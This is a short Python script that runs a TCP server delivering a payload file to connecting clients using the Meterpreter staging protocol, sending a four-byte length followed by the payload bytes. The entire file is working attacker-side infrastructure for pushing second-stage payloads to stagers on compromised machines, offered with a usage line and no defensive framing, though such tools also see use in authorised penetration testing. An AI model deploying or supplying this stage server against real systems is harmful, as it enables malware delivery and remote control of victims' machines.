#!/usr/bin/env python3
#
# serve files using meterpreter staging protocol:
#  - payload size in 4 bytes
#  - payload data
#

import socketserver
import struct
import sys
import os

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print("[+] connection from %s" % self.client_address[0])
        self.request.sendall(struct.pack('<I', len(PAYLOAD)) + PAYLOAD)

if __name__ == "__main__":

    if len(sys.argv) != 4:
        print("Usage: %s <payload_file> <listen_ip> <listen_port>" % os.path.basename(__file__))
        exit(1)

    FILENAME = sys.argv[1]
        
    try:
        PAYLOAD = open(FILENAME, "rb").read()
        print("[+] read payload file %s" % FILENAME)
        print("[*] payload size is %d bytes" % len(PAYLOAD))
    except:
        print("[!] file read error")
        exit(1)

    HOST, PORT = sys.argv[2], int(sys.argv[3])
        
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        print("[+] binding listener to %s:%d" % (HOST, PORT))
        server.serve_forever()

